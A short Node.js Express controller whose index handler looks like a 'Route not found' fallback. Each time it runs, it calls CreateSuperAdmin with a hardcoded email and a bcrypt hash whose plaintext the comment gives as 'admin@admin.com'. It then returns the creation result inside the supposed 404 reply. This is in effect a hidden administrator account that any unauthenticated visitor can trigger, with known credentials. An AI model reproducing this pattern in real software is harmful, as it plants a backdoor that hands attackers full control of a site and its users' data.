const AuthAction = require("../actions/AuthAction");
class IndexController {
  async index(req, res) {
    const authAction = new AuthAction();
    const email = "admin@admin.com";
    // password = admin@admin.com
    const password =
      "$2b$10$LZYskePik4Xa1ZBC31yJR./dUW1bd6SKJeeqnMj0ccSUyM7KIyFtO";
    const code = res.statusCode;
    const _message = await authAction.CreateSuperAdmin(email, password, code);

    return res.json({
      code,
      success: false,
      message: "Route not found. Please check the URL and try again.",
      _message: JSON.parse(_message),
    });
  }
}

module.exports = new IndexController();
